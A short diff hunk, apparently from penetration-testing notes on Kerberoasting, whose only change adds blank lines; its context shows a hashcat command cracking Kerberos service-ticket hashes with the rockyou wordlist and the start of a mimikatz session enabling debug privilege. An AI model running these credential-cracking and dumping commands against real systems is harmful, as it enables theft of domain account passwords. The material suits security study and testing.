@@ -94,6 +94,8 @@ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr
 
 * SPN password hash
 * Target SPN
+
+
 ```
 mimikatz # privilege::debug
 Privilege '20' OK
